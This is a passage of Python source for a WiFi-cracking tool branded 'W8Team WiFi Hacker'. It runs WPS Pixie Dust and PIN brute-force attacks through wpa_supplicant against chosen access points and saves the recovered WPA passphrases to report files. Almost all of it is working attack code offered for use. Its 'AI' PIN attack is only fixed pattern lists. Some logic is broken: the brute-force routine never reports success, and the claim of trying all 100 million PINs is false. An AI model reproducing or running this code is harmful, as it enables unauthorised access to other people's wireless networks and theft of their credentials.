    def _attack_selected_network(self, network, attack_mode):
        """Attack the selected network"""
        bssid = network['BSSID']
        essid = network['ESSID']
        
        print(f"\n[*] 🎯 Attacking: {essid} ({bssid})")
        print(f"[*] Method: {attack_mode}")
        
        companion = Companion(self.interface, save_result=True)
        
        start_time = time.time()
        
        if attack_mode == "pixie":
            success = companion.single_connection(bssid, pixiemode=True)
        elif attack_mode == "bruteforce":
            success = companion.smart_bruteforce(bssid)
        elif attack_mode == "ai_pin":
            success = self._ai_pin_attack(companion, bssid)
        else:
            success = False
            
        elapsed_time = time.time() - start_time
        
        if success:
            print(f"[+] ✅ Attack successful in {elapsed_time:.1f} seconds!")
            self._save_attack_result(bssid, essid, attack_mode, True, elapsed_time)
        else:
            print(f"[-] ❌ Attack failed after {elapsed_time:.1f} seconds")
            self._save_attack_result(bssid, essid, attack_mode, False, elapsed_time)
            
        companion.cleanup()
        input("\n[+] Press Enter to continue...")
        
    def _ai_pin_attack(self, companion, bssid):
        """AI-enhanced PIN prediction attack with full range brute force"""
        print("[*] 🤖 Starting AI PIN Prediction...")
        print("[*] 🎯 Will try ALL WPS PINs from 00000000 to 99999999")
        print("[*] 📊 Total combinations: 100,000,000 PINs")
        
        # Phase 1: Try AI-generated high-probability PINs first
        print("[*] 🧠 Phase 1: Trying AI-generated high-probability PINs...")
        ai_pins = self._generate_ai_pins(bssid)
        
        for i, pin in enumerate(ai_pins[:100]):  # Try top 100 AI predictions first
            print(f"[*] 🎯 AI PIN {i+1}/100: {pin}")
            success = companion.single_connection(bssid, pin)
            
            if success:
                print(f"[+] ✅ AI PIN successful: {pin}")
                return True
        
        print("[*] 🔄 Phase 1 complete. Starting full range brute force...")
        
        # Phase 2: Smart brute force with intelligent patterns
        print("[*] 🚀 Phase 2: Smart Pattern-Based PIN Attack")
        print("[*] 🧠 Using intelligent attack order (most likely patterns first)")
        
        wps_gen = WPSpin()
        tried_pins = set(ai_pins)  # Don't repeat AI pins
        attempt_count = 0
        
        # Smart PIN generation strategies (ordered by likelihood)
        smart_patterns = [
            self._generate_common_pins(),
            self._generate_manufacturer_defaults(),
            self._generate_date_patterns(),
            self._generate_sequential_patterns(),
            self._generate_repetitive_patterns(),
            self._generate_keyboard_patterns(),
            self._generate_mathematical_patterns(bssid),
            self._generate_random_smart_pins(bssid)
        ]
        
        for pattern_name, pin_generator in smart_patterns:
            print(f"[*] 🎯 Trying {pattern_name} patterns...")
            
            for pin_base in pin_generator:
                if len(pin_base) == 7:
                    checksum = wps_gen.checksum(int(pin_base))
                    full_pin = pin_base + str(checksum)
                elif len(pin_base) == 8:
                    full_pin = pin_base
                else:
                    continue
                
                if full_pin in tried_pins:
                    continue
                    
                tried_pins.add(full_pin)
                attempt_count += 1
                
                # Display progress every 1000 attempts
                if attempt_count % 1000 == 0:
                    print(f"[*] 📈 Smart Attack Progress: {attempt_count:,} PINs tested | Current: {full_pin}")
                
                # Try the PIN
                success = companion.single_connection(bssid, full_pin)
                
                if success:
                    print(f"[+] ✅ SMART PIN FOUND: {full_pin}")
                    print(f"[+] 🧠 Found using {pattern_name} strategy!")
                    print(f"[+] 🏆 Cracked after {attempt_count:,} smart attempts!")
                    return True
                
                # Save progress every 10,000 attempts
                if attempt_count % 10000 == 0:
                    self._save_bruteforce_progress(bssid, attempt_count, full_pin)
        
        print(f"[-] 🤔 Smart patterns exhausted after {attempt_count:,} attempts")
        print("[*] 🔄 Falling back to systematic brute force (if enabled)...")
        
        # Phase 3: Systematic brute force (optional - can be disabled for speed)
        return self._systematic_bruteforce(companion, bssid, tried_pins, attempt_count)
        
    def _generate_ai_pins(self, bssid):
        """Generate AI-predicted PINs based on BSSID patterns"""
        pins = []
        
        # Extract MAC address parts
        mac_parts = bssid.replace(':', '').upper()
        
        # Pattern-based PIN generation
        # Last 6 digits patterns
        last6 = mac_parts[-6:]
        pins.append(last6 + "00")
        pins.append(last6 + "01")
        pins.append(last6 + "11")
        
        # Common manufacturer patterns
        oui = mac_parts[:6]  # Organizational Unique Identifier
        
        # Add common PIN patterns for different manufacturers
        manufacturer_pins = {
            "001F3F": ["12345670", "00000000", "11111111"],  # Huawei
            "B0487A": ["20172527", "12345670"],              # Technicolor
            "00E04C": ["12345678", "87654321"],              # Realtek
            "D4BF7F": ["20852085", "12345670"],              # Upvel
        }
        
        if oui in manufacturer_pins:
            pins.extend(manufacturer_pins[oui])
            
        # Mathematical patterns based on MAC
        mac_int = int(mac_parts, 16)
        pins.append(str(mac_int % 100000000).zfill(8))
        pins.append(str((mac_int // 1000) % 100000000).zfill(8))
        
        # Date-based patterns (common router defaults)
        current_year = datetime.now().year
        for year in range(current_year, current_year - 5, -1):
            pins.append(f"{year}0101")
            pins.append(f"0101{year}")
            
        # Remove duplicates and ensure valid checksum
        unique_pins = []
        wps_gen = WPSpin()
        
        for pin in pins:
            if len(pin) == 8 and pin not in unique_pins:
                unique_pins.append(pin)
            elif len(pin) == 7:
                # Add checksum
                pin_with_checksum = pin + str(wps_gen.checksum(int(pin)))
                if pin_with_checksum not in unique_pins:
                    unique_pins.append(pin_with_checksum)
                    
        return unique_pins[:100]  # Return top 100 predictions
        
    def _generate_common_pins(self):
        """Generate most common WPS PINs found in the wild"""
        common_pins = [
            # Most common WPS PINs
            "1234567", "0000000", "1111111", "2222222", "3333333", "4444444", 
            "5555555", "6666666", "7777777", "8888888", "9999999",
            "1234560", "0123456", "9876543", "1357913", "2468024",
            "1122334", "5566778", "9900112", "3344556", "7788990",
            "0101010", "1010101", "2020202", "3030303", "4040404",
            "5050505", "6060606", "7070707", "8080808", "9090909",
            # Default admin pins
            "1234567", "7654321", "0987654", "5432109", "9876543",
            "1111000", "2222000", "3333000", "4444000", "5555000",
            "6666000", "7777000", "8888000", "9999000", "0000111"
        ]
        return ("Common WPS PINs", common_pins)
        
    def _generate_manufacturer_defaults(self):
        """Generate manufacturer default PINs"""
        defaults = [
            # Router manufacturer defaults
            "1234567", "0000000", "1111111", "2017252", "4626484", "7622990",
            "6232714", "1086411", "3195719", "3043203", "7141225", "6817554",
            "9566146", "9571911", "4856371", "2085483", "4397768", "0529417",
            "9995604", "3561153", "6795814", "3425928", "9422988", "9575521",
            # Common ISP defaults
            "2017252", "2008001", "2010001", "2011001", "2012001", "2013001",
            "2014001", "2015001", "2016001", "2017001", "2018001", "2019001",
            "2020001", "2021001", "2022001", "2023001", "2024001"
        ]
        return ("Manufacturer Defaults", defaults)
        
    def _generate_date_patterns(self):
        """Generate date-based patterns"""
        date_pins = []
        current_year = datetime.now().year
        
        # Years (2000-2030)
        for year in range(2000, 2031):
            date_pins.extend([
                f"{year}010", f"{year}000", f"{year}123", f"{year}111",
                f"010{year}", f"123{year}", f"111{year}", f"000{year}",
                f"{str(year)[2:]}0101", f"{str(year)[2:]}1111", f"{str(year)[2:]}0000"
            ])
        
        # Months and days
        for month in range(1, 13):
            for day in range(1, 32):
                if month <= 12 and day <= 31:
                    date_pins.extend([
                        f"{month:02d}{day:02d}{current_year % 100:02d}",
                        f"{day:02d}{month:02d}{current_year % 100:02d}",
                        f"{current_year % 100:02d}{month:02d}{day:02d}"
                    ])
        
        return ("Date Patterns", date_pins[:10000])  # Limit for performance
        
    def _generate_sequential_patterns(self):
        """Generate sequential number patterns"""
        sequential = []
        
        # Ascending sequences
        for start in range(0, 6):
            seq = ""
            for i in range(7):
                seq += str((start + i) % 10)
            sequential.append(seq)
        
        # Descending sequences
        for start in range(9, 3, -1):
            seq = ""
            for i in range(7):
                seq += str((start - i) % 10)
            sequential.append(seq)
        
        # Step sequences
        for step in [2, 3, 4, 5]:
            for start in range(0, 10):
                seq = ""
                for i in range(7):
                    seq += str((start + i * step) % 10)
                sequential.append(seq)
        
        return ("Sequential Patterns", sequential)
        
    def _generate_repetitive_patterns(self):
        """Generate repetitive number patterns"""
        repetitive = []
        
        # Same digit repeated
        for digit in range(10):
            repetitive.append(str(digit) * 7)
        
        # Two digit patterns
        for d1 in range(10):
            for d2 in range(10):
                if d1 != d2:
                    pattern = (str(d1) + str(d2)) * 3 + str(d1)
                    repetitive.append(pattern)
        
        # Three digit patterns
        for d1 in range(10):
            for d2 in range(10):
                for d3 in range(10):
                    if len(set([d1, d2, d3])) == 3:
                        pattern = (str(d1) + str(d2) + str(d3)) * 2 + str(d1)
                        repetitive.append(pattern)
                        if len(repetitive) > 1000:  # Limit for performance
                            break
                if len(repetitive) > 1000:
                    break
            if len(repetitive) > 1000:
                break
        
        return ("Repetitive Patterns", repetitive)
        
    def _generate_keyboard_patterns(self):
        """Generate keyboard layout based patterns"""
        keyboard_patterns = [
            # QWERTY patterns (converted to numbers)
            "1234567", "7654321", "2468013", "1357924", "9630741",
            "1472583", "3692581", "7410852", "8520741", "9630147",
            # Phone keypad patterns
            "1593572", "3571593", "7539514", "1590123", "3570951",
            "7530159", "9510357", "2580147", "4680357", "6420159"
        ]
        return ("Keyboard Patterns", keyboard_patterns)
        
    def _generate_mathematical_patterns(self, bssid):
        """Generate mathematical sequence based patterns"""
        mac_int = int(bssid.replace(':', ''), 16)
        math_patterns = []
        
        # Fibonacci-like sequences
        for seed in range(1, 10):
            fib = [seed, seed]
            for _ in range(5):
                fib.append((fib[-1] + fib[-2]) % 10)
            math_patterns.append(''.join(map(str, fib)))
        
        # Prime number based
        primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47]
        for i in range(len(primes) - 6):
            pattern = ''.join(str(p % 10) for p in primes[i:i+7])
            math_patterns.append(pattern)
        
        # MAC address derived patterns
        mac_digits = ''.join(filter(str.isdigit, bssid.replace(':', '')))
        if len(mac_digits) >= 7:
            math_patterns.append(mac_digits[:7])
            math_patterns.append(mac_digits[-7:])
            math_patterns.append(mac_digits[:7][::-1])  # Reverse
        
        return ("Mathematical Patterns", math_patterns)
        
    def _generate_random_smart_pins(self, bssid):
        """Generate smart random PINs based on BSSID entropy"""
        import hashlib
        smart_randoms = []
        
        # Use BSSID as seed for deterministic "random" generation
        for i in range(1000):
            seed = f"{bssid}{i}"
            hash_result = hashlib.md5(seed.encode()).hexdigest()
            numeric_hash = ''.join(filter(str.isdigit, hash_result))
            if len(numeric_hash) >= 7:
                smart_randoms.append(numeric_hash[:7])
        
        return ("Smart Random", smart_randoms)
        
    def _systematic_bruteforce(self, companion, bssid, tried_pins, start_count):
        """Systematic brute force as last resort (can be disabled)"""
        print("[*] ⚠️  Starting systematic brute force (this may take a very long time)")
        print("[*] 💡 Tip: You can stop this and try other targets instead")
        
        wps_gen = WPSpin()
        
        # Start from where smart patterns left off
        for base_num in range(start_count, 10000000):  # Only try up to 10M for practicality
            base_pin = f"{base_num:07d}"
            checksum = wps_gen.checksum(int(base_pin))
            full_pin = base_pin + str(checksum)
            
            if full_pin in tried_pins:
                continue
                
            if base_num % 50000 == 0:
                progress = (base_num / 10000000) * 100
                print(f"[*] 📈 Systematic Progress: {progress:.1f}% | PIN: {full_pin} | {base_num:,}/10,000,000")
            
            success = companion.single_connection(bssid, full_pin)
            
            if success:
                print(f"[+] ✅ SYSTEMATIC PIN FOUND: {full_pin}")
                print(f"[+] 🏆 Total attempts: {base_num + start_count:,}")
                return True
        
        print("[-] 🔚 Systematic brute force completed (10M attempts)")
        return False
        
    def _save_bruteforce_progress(self, bssid, current_pin, last_pin):
        """Save brute force progress for resuming later"""
        try:
            progress_data = {
                'bssid': bssid,
                'current_pin': current_pin,
                'last_pin_tried': last_pin,
                'timestamp': datetime.now().isoformat(),
                'progress_percent': (current_pin / 100000000) * 100
            }
            
            filename = f"bruteforce_progress_{bssid.replace(':', '')}.json"
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(progress_data, f, indent=2)
                
            print(f"[*] 💾 Progress saved: {current_pin:,}/100,000,000 ({progress_data['progress_percent']:.3f}%)")
        except Exception as e:
            print(f"[-] ⚠️ Could not save progress: {e}")
        
    def _save_attack_result(self, bssid, essid, method, success, time_taken):
        """Save attack results to file"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        status = "SUCCESS" if success else "FAILED"
        result_line = f"{timestamp} | {bssid} | {essid} | {method} | {status} | {time_taken:.1f}s\n"
        
        with open("attack_history.txt", "a", encoding="utf-8") as f:
            f.write(result_line)
            
    def view_saved_passwords(self):
        """Display all saved passwords"""
        print("\n╔══════════════════════════════════════════════════════════════╗")
        print("║                     💾 SAVED PASSWORDS                      ║")
        print("╚══════════════════════════════════════════════════════════════╝")
        
        files_to_check = [
            ("reports/stored.csv", "CSV Format"),
            ("reports/All WIFI Passoword And WPS Pin.txt", "Text Format"),
            ("attack_history.txt", "Attack History"),
            ("auto_attack_results.txt", "Auto Attack Results")
        ]
        
        found_any = False
        
        for filename, description in files_to_check:
            if os.path.exists(filename):
                found_any = True
                print(f"\n[+] {description}: {filename}")
                
                try:
                    with open(filename, 'r', encoding='utf-8') as f:
                        content = f.read()
                        if content.strip():
                            lines = content.strip().split('\n')
                            print(f"    📋 Total entries: {len(lines)}")
                            
                            # Show last 5 entries
                            print("    🔍 Recent entries:")
                            for line in lines[-5:]:
                                print(f"    • {line}")
                        else:
                            print("    📝 File is empty")
                            
                except Exception as e:
                    print(f"    ❌ Error reading file: {e}")
            else:
                print(f"[-] {description}: Not found")
                
        if not found_any:
            print("\n[-] No saved passwords found")
            print("[*] Attack some networks first to save passwords!")
            
        input("\n[+] Press Enter to continue...")
        
    def open_telegram(self):
        """Open Telegram link"""
        telegram_url = "https://t.me/W8SOJIB"
        print(f"\n[*] 📱 Opening Telegram: {telegram_url}")
        
        try:
            # Try different methods to open URL in Termux
            commands = [
                f"am start -a android.intent.action.VIEW -d {telegram_url}",
                f"termux-open-url {telegram_url}",
                f"xdg-open {telegram_url}"
            ]
            
            for cmd in commands:
                try:
                    subprocess.run(cmd, shell=True, check=True)
                    print("[+] ✅ Telegram opened successfully!")
                    break
                except:
                    continue
            else:
                print(f"[*] Manual link: {telegram_url}")
                print("[*] Copy and paste the link in your browser/Telegram")
                
        except Exception as e:
            print(f"[-] Error opening Telegram: {e}")
            print(f"[*] Manual link: {telegram_url}")
            
        input("\n[+] Press Enter to continue...")
        
    def run_menu(self):
        """Main menu loop"""
        while True:
            os.system('clear' if os.name == 'posix' else 'cls')
            show_w8team_banner()
            show_main_menu()
            
            try:
                choice = input("\n[?] Select option (1-7): ").strip()
                
                if choice == "1":
                    self.auto_attacker.auto_find_and_attack()
                    input("\n[+] Press Enter to continue...")
                    
                elif choice == "2":
                    self.show_wifi_networks("pixie")
                    
                elif choice == "3":
                    self.show_wifi_networks("bruteforce")
                    
                elif choice == "4":
                    self.show_wifi_networks("ai_pin")
                    
                elif choice == "5":
                    self.view_saved_passwords()
                    
                elif choice == "6":
                    self.open_telegram()
                    
                elif choice == "7":
                    print("\n[*] 👋 Thanks for using W8Team WiFi Hacker!")
                    print("[*] 📱 Follow us: https://t.me/W8SOJIB")
                    break
                    
                else:
                    print("[-] Invalid option. Please select 1-7")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print("\n\n[*] 👋 Goodbye!")
                break
            except Exception as e:
                print(f"[-] Error: {e}")
                time.sleep(2)


class Companion:
    """Main application part"""
    def __init__(self, interface, save_result=False, print_debug=False):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug

        self.tempdir = tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
            self.tempconf = temp.name
        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
        self.__init_wpa_supplicant()

        self.res_socket_file = f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)

        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()

        user_home = str(pathlib.Path.home())
        self.sessions_dir = f'{user_home}/.OneShot/sessions/'
        self.pixiewps_dir = f'{user_home}/.OneShot/pixiewps/'
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        if not os.path.exists(self.sessions_dir):
            os.makedirs(self.sessions_dir)
        if not os.path.exists(self.pixiewps_dir):
            os.makedirs(self.pixiewps_dir)

        self.generator = WPSpin()

    def __init_wpa_supplicant(self):
        print('[*] Running wpa_supplicant…')
        cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
        self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        # Waiting for wpa_supplicant control interface initialization
        while True:
            ret = self.wpas.poll()
            if ret is not None and ret != 0:
                raise ValueError('wpa_supplicant returned an error: ' + self.wpas.communicate()[0])
            if os.path.exists(self.wpas_ctrl_path):
                break
            time.sleep(.1)

    def sendOnly(self, command):
        """Sends command to wpa_supplicant"""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def sendAndReceive(self, command):
        """Sends command to wpa_supplicant and returns the reply"""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        (b, address) = self.retsock.recvfrom(4096)
        inmsg = b.decode('utf-8', errors='replace')
        return inmsg

    @staticmethod
    def _explain_wpas_not_ok_status(command: str, respond: str):
        if command.startswith(('WPS_REG', 'WPS_PBC')):
            if respond == 'UNKNOWN COMMAND':
                return ('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
                        'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
        return '[!] Something went wrong — check out debug log'

    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None):
        if not verbose:
            verbose = self.print_debug
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return False
        line = line.rstrip('\n')

        if verbose:
            sys.stderr.write(line + '\n')

        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                print('[*] Sending WPS Message M{}…'.format(n))
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                print('[*] Received WPS Message M{}'.format(n))
                if n == 5:
                    print('[+] The first half of the PIN is valid')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                print('[*] Received WSC NACK')
                print('[-] Error: wrong PIN code')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = get_hex(line)
                assert(len(self.pixie_creds.e_nonce) == 16*2)
                if pixiemode:
                    print('[P] E-Nonce: {}'.format(self.pixie_creds.e_nonce))
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                assert(len(self.pixie_creds.pkr) == 192*2)
                if pixiemode:
                    print('[P] PKR: {}'.format(self.pixie_creds.pkr))
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                assert(len(self.pixie_creds.pke) == 192*2)
                if pixiemode:
                    print('[P] PKE: {}'.format(self.pixie_creds.pke))
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = get_hex(line)
                assert(len(self.pixie_creds.authkey) == 32*2)
                if pixiemode:
                    print('[P] AuthKey: {}'.format(self.pixie_creds.authkey))
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                assert(len(self.pixie_creds.e_hash1) == 32*2)
                if pixiemode:
                    print('[P] E-Hash1: {}'.format(self.pixie_creds.e_hash1))
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                assert(len(self.pixie_creds.e_hash2) == 32*2)
                if pixiemode:
                    print('[P] E-Hash2: {}'.format(self.pixie_creds.e_hash2))
            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
        elif ': State: ' in line:
            if '-> SCANNING' in line:
                self.connection_status.status = 'scanning'
                print('[*] Scanning…')
        elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
            self.connection_status.status = 'WPS_FAIL'
            print('[-] wpa_supplicant returned WPS-FAIL')
#        elif 'NL80211_CMD_DEL_STATION' in line:
#            print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print('[*] Authenticating…')
        elif 'Authentication response' in line:
            print('[+] Authenticated')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print('[*] Associating with AP…')
        elif ('Associated with' in line) and (self.interface in line):
            bssid = line.split()[-1].upper()
            if self.connection_status.essid:
                print('[+] Associated with {} (ESSID: {})'.format(bssid, self.connection_status.essid))
            else:
                print('[+] Associated with {}'.format(bssid))
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            print('[*] Sending EAPOL Start…')
        elif 'EAP entering state IDENTITY' in line:
            print('[*] Received Identity Request')
        elif 'using real identity' in line:
            print('[*] Sending Identity Response…')
        elif pbc_mode and ('selected BSS ' in line):
            bssid = line.split('selected BSS ')[-1].split()[0].upper()
            self.connection_status.bssid = bssid
            print('[*] Selected AP: {}'.format(bssid))

        return True

    def __runPixiewps(self, showcmd=False, full_range=False):
        print("[*] Running Pixiewps…")
        cmd = self.pixie_creds.get_pixie_cmd(full_range)
        if showcmd:
            print(cmd)
        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                           stderr=sys.stdout, encoding='utf-8', errors='replace')
        print(r.stdout)
        if r.returncode == 0:
            lines = r.stdout.splitlines()
            for line in lines:
                if ('[+]' in line) and ('WPS pin' in line):
                    pin = line.split(':')[-1].strip()
                    if pin == '<empty>':
                        pin = "''"
                    return pin
        return False

    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
        print(f"[+] WPS PIN: '{wps_pin}'")
        print(f"[+] WPA PSK: '{wpa_psk}'")
        print(f"[+] AP SSID: '{essid}'")

    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
        if not os.path.exists(self.reports_dir):
            os.makedirs(self.reports_dir)
        # Save to the requested file name
        filename = self.reports_dir + 'All WIFI Passoword And WPS Pin'
        dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
        with open(filename + '.txt', 'a', encoding='utf-8') as file:
            file.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'.format(
                        dateStr, bssid, essid, wps_pin, wpa_psk
                    )
            )
        writeTableHeader = not os.path.isfile(self.reports_dir + 'stored.csv')
        with open(self.reports_dir + 'stored.csv', 'a', newline='', encoding='utf-8') as file:
            csvWriter = csv.writer(file, delimiter=';', quoting=csv.QUOTE_ALL)
            if writeTableHeader:
                csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
            csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
        print(f'[i] Credentials saved to {filename}.txt, stored.csv')

    def __savePin(self, bssid, pin):
        filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
        with open(filename, 'w') as file:
            file.write(pin)
        print('[i] PIN saved in {}'.format(filename))

    def __prompt_wpspin(self, bssid):
        pins = self.generator.getSuggested(bssid)
        if len(pins) > 1:
            print(f'PINs generated for {bssid}:')
            print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
            for i, pin in enumerate(pins):
                number = '{})'.format(i + 1)
                line = '{:<3} {:<10} {:<}'.format(
                    number, pin['pin'], pin['name'])
                print(line)
            while 1:
                pinNo = input('Select the PIN: ')
                try:
                    if int(pinNo) in range(1, len(pins)+1):
                        pin = pins[int(pinNo) - 1]['pin']
                    else:
                        raise IndexError
                except Exception:
                    print('Invalid number')
                else:
                    break
        elif len(pins) == 1:
            pin = pins[0]
            print('[i] The only probable PIN is selected:', pin['name'])
            pin = pin['pin']
        else:
            return None
        return pin

    def __wps_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, verbose=None):
        if not verbose:
            verbose = self.print_debug
        self.pixie_creds.clear()
        self.connection_status.clear()
        self.wpas.stdout.read(300)   # Clean the pipe
        if pbc_mode:
            if bssid:
                print(f"[*] Starting WPS push button connection to {bssid}…")
                cmd = f'WPS_PBC {bssid}'
            else:
                print("[*] Starting WPS push button connection…")
                cmd = 'WPS_PBC'
        else:
            print(f"[*] Trying PIN '{pin}'…")
            cmd = f'WPS_REG {bssid} {pin}'
        r = self.sendAndReceive(cmd)
        if 'OK' not in r:
            self.connection_status.status = 'WPS_FAIL'
            print(self._explain_wpas_not_ok_status(cmd, r))
            return False

        while True:
            res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose)
            if not res:
                break
            if self.connection_status.status == 'WSC_NACK':
                break
            elif self.connection_status.status == 'GOT_PSK':
                break
            elif self.connection_status.status == 'WPS_FAIL':
                break

        self.sendOnly('WPS_CANCEL')
        return False

    def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
                          pixieforce=False, store_pin_on_fail=False):
        if not pin:
            if pixiemode:
                try:
                    # Try using the previously calculated PIN
                    filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                    with open(filename, 'r') as file:
                        t_pin = file.readline().strip()
                        if input('[?] Use previously calculated PIN {}? [n/Y] '.format(t_pin)).lower() != 'n':
                            pin = t_pin
                        else:
                            raise FileNotFoundError
                except FileNotFoundError:
                    pin = self.generator.getLikely(bssid) or '12345670'
            elif not pbc_mode:
                # If not pixiemode, ask user to select a pin from the list
                pin = self.__prompt_wpspin(bssid) or '12345670'
        if pbc_mode:
            self.__wps_connection(bssid, pbc_mode=pbc_mode)
            bssid = self.connection_status.bssid
            pin = '<PBC mode>'
        elif store_pin_on_fail:
            try:
                self.__wps_connection(bssid, pin, pixiemode)
            except KeyboardInterrupt:
                print("\nAborting…")
                self.__savePin(bssid, pin)
                return False
        else:
            self.__wps_connection(bssid, pin, pixiemode)

        if self.connection_status.status == 'GOT_PSK':
            self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
            # Always save credentials to file, regardless of self.save_result
            self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
            if not pbc_mode:
                # Try to remove temporary PIN file
                filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                try:
                    os.remove(filename)
                except FileNotFoundError:
                    pass
            return True
        elif pixiemode:
            if self.pixie_creds.got_all():
                pin = self.__runPixiewps(showpixiecmd, pixieforce)
                if pin:
                    return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
                return False
            else:
                print('[!] Not enough data to run Pixie Dust attack')
                return False
        else:
            if store_pin_on_fail:
                # Saving Pixiewps calculated PIN if can't connect
                self.__savePin(bssid, pin)
            return False

    def __first_half_bruteforce(self, bssid, f_half, delay=None):
        """
        @f_half — 4-character string
        """
        checksum = self.generator.checksum
        while int(f_half) < 10000:
            t = int(f_half + '000')
            pin = '{}000{}'.format(f_half, checksum(t))
            self.single_connection(bssid, pin)
            if self.connection_status.isFirstHalfValid():
                print('[+] First half found')
                return f_half
            elif self.connection_status.status == 'WPS_FAIL':
                print('[!] WPS transaction failed, re-trying last pin')
                return self.__first_half_bruteforce(bssid, f_half)
            f_half = str(int(f_half) + 1).zfill(4)
            self.bruteforce.registerAttempt(f_half)
            if delay:
                time.sleep(delay)
        print('[-] First half not found')
        return False

    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
        """
        @f_half — 4-character string
        @s_half — 3-character string
        """
        checksum = self.generator.checksum
        while int(s_half) < 1000:
            t = int(f_half + s_half)
            pin = '{}{}{}'.format(f_half, s_half, checksum(t))
            self.single_connection(bssid, pin)
            if self.connection_status.last_m_message > 6:
                return pin
            elif self.connection_status.status == 'WPS_FAIL':
                print('[!] WPS transaction failed, re-trying last pin')
                return self.__second_half_bruteforce(bssid, f_half, s_half)
            s_half = str(int(s_half) + 1).zfill(3)
            self.bruteforce.registerAttempt(f_half + s_half)
            if delay:
                time.sleep(delay)
        return False

    def smart_bruteforce(self, bssid, start_pin=None, delay=None):
        # Random 8-digit WPS PINs with valid checksum
        tried_pins = set()
        self.bruteforce = BruteforceStatus()
        while True:
            # Generate random 7-digit base
            base_pin = random.randint(0, 9999999)
            base_pin_str = str(base_pin).zfill(7)
            pin_int = int(base_pin_str)
            checksum = self.generator.checksum(pin_int)
            pin = base_pin_str + str(checksum)
            if pin in tried_pins:
                continue
            tried_pins.add(pin)
            self.bruteforce.mask = pin
            self.single_connection(bssid, pin)
            if self.connection_status.status == 'GOT_PSK':
                break
            if delay:
                time.sleep(delay)
            # Optional: stop after a very large number of attempts to avoid infinite loop
            if len(tried_pins) >= 10000000:  # All possible 7-digit bases
                print('Tried all possible random pins!')
                break

    def cleanup(self):
        self.retsock.close()
        self.wpas.terminate()
        os.remove(self.res_socket_file)
        shutil.rmtree(self.tempdir, ignore_errors=True)
        os.remove(self.tempconf)

    def __del__(self):
        self.cleanup()


class WiFiScanner:
    """docstring for WiFiScanner"""
    def __init__(self, interface, vuln_list=None, reverse_scan=False):
        self.interface = interface
        self.vuln_list = vuln_list
        self.reverse_scan = reverse_scan

